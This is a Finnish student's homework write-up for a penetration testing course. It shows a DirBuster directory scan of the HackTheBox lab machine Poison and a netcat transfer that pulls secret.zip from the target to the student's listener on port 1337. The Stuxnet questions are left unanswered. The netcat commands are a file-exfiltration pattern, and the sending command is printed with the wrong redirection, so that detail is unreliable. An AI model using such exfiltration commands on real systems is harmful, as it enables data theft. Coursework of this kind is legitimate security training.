Penetration Testing Course – ict4tn027-3001  
Haaga-Helia  
Opettaja: [Tero Karvinen](http://terokarvinen.com/2018/penetration-testing-course-autumn-2018)  

1) Korkkaa Poison. Jos et pääse root shelliin asti, kuvaile, mihin pääsit ja mitä johtolankoja jäi tutkimatta.

2) CTF walktrough. Katso Youtubesta jokin CTF walktrough (muu kuin HackTheBox). Mitä opit, mitä ideoita sait? Kokeile vähintään kolmea itsellesi uutta työkalua, joita opit videosta.

3) Stuxnet. Lue artikkeli Stuxnetista, esim. Symantec tai Langer. Voit hakea ‘stuxnet analysis’. 1) Miten Stuxnet murtautui koneille? Yleisluontoinen vastaus (mikä hyökkäys millekin käyttöjärjestelmälle mihin komponenttiin) riittää, koska nämä hyökkäykset ovat jo vanhentuneet. 2) Miten ohjaus (command and control, C2) toimi? 3) Miten Stuxnet ylitti ilmaraon (air gap)?


# Tehtävä 2 #

Etsin Youtubesta CTF walkthrough [videon](https://www.youtube.com/watch?v=CuBX3sBeGSw), jossa esitellään murtautumista koneeseen nimeltään [derpNStink](https://www.vulnhub.com/entry/derpnstink-1,221/). Videon kuvauksen mukaan kyseessä on melko helppo kohde.  

**Uusia työkaluja videolta:**  
**[OWASP DirBuster](https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)**  
"DirBuster is a multi threaded java application designed to brute force directories and files names on web/application servers. Often is the case now of what looks like a web server in a state of default installation is actually not, and has pages and applications hidden within. DirBuster attempts to find these."  
Kuulostaa ohjelmalta, jolle varmasti löytyy käyttöä tulevaisuudessa. En ole ratkaissut Poisonia vielä loppuun asti (*teen osittain tehtävän 2 ennen tehtävää 1*), joten voisin ratkoa sitä alusta asti omalla virtuaalikoneellani käyttäen hieman eri työkaluja.

**Asennus**
1. Latasin [DirBuster Jar -tiedoston](http://downloads.sourceforge.net/dirbuster/DirBuster-0.12.tar.bz2?use_mirror=osdn)  
2. Paketin purku ja käyttö:  
```
cd Downloads
tar xvjf DirBuster-0.12.tar.bz2
cd DirBuster-0.12/
java -jar DirBuster-0.12.jar
```
(tar -tiedoston purkuun hyvät [ohjeet](https://www.hostingadvice.com/how-to/untar-file-linuxubuntu/))

`java -jar DirBuster-0.12.jar` siis suorittaa ohjelman. **Huom!**, se ei avannut graafista ikkunaa Puttyllä, vaan jouduin käyttämään VirtualBoxin terminaalia että sain interfacen käyttööni.  
![Buster_DL](https://i.imgur.com/whON9lZ.png)  

Osoitteeksi laitin Poisonin IP:n ja halutun portin: *http://10.10.10.84:80*  
Browse -painikkeesta pääsin suoraan valitsemaan listan mitä käyttää skannauksessa. Valitsin *directory-list-lowercase.2.3-small.txt*  
![DirBust](https://i.imgur.com/nyZ7UDA.png)  

Skannauksen loputtua näin tulokset suoraan ja pystyin *Report* -painikkeesta luomaan *txt* -tiedoston tuloksista haluamaani paikkaan.  
![DirBusted](https://i.imgur.com/uLvRCxv.png)

![BusteReport](https://i.imgur.com/ftp0qrp.png)

Toivoin että DirBuster olisi kertonut hieman enemmän, mutta ehkä Poison on tämän ohjelman testaamiseen huono maali, koska se ilmoittaa omilla verkkosivuillaan avoinna olevat sivut. Jos maalikone ei jakaisi tietoa niin anteliaasti, olisi DirBusterin anti paljon arvokkaampaa. Tähän päättyy tämän ohjelman testaus.  


**[Netcat](https://www.digitalocean.com/community/tutorials/how-to-use-netcat-to-establish-and-test-tcp-and-udp-connections-on-a-vps)**  

Koitan kerrata Poisonin korkkausta uusilla työkaluilla, joten tehdään jotain myös Netcatin avulla. Aiemmin tällä viikolla murtauduin Poisoniin ja *secret.zip* -tiedoston omalle koneelleni SFTP:n avulla. Komento taisi olla `sftp ssh charix@10.10.10.84` ellen väärin muista.  
Kokeillaan tehdä sama asia Netcatilla. Ensiksi laitin oman koneeni kuuntelemaan porttia 1337 ja nimeämään vastaanotetun tiedoston:  
`nc -l -p 1337 > secret.zip`  
Seuraavaksi pyrin lähettämään tiedoston Poisonista. Käyttö-oikeudet ilmeisesti paukkuivat, joten siirryin */tmp* -kansioon, johon olin aikeissa tuodo *secret.zip* -tiedoston, mutta se löytyi sieltä jo valmiiksi. Siellä ajoin komennon:  
`nc 10.10.13.63 1337 > secret.zip`  

Aikaa kului noin sekunti ja tiedosto tuli perille!  
![Netcat](https://i.imgur.com/ewfoweY.png)


**Hashcat**  
En tiedä pääsenkö välittömästi kokeilemaan kyseistä ohjelmaa, mutta varmasti törmään maalikoneiden parissa tilanteeseen jossa sille on käyttöä. Työkalun avulla käännetään hashista selkokielinen salasana.


# Tehtävä 3 #

Stuxnet. Lue artikkeli Stuxnetista, esim. Symantec tai Langer. Voit hakea ‘stuxnet analysis’.

1) Miten Stuxnet murtautui koneille? Yleisluontoinen vastaus (mikä hyökkäys millekin 
käyttöjärjestelmälle mihin komponenttiin) riittää, koska nämä hyökkäykset ovat jo vanhentuneet.


2) Miten ohjaus (command and control, C2) toimi? 3) Miten Stuxnet ylitti ilmaraon (air gap)?


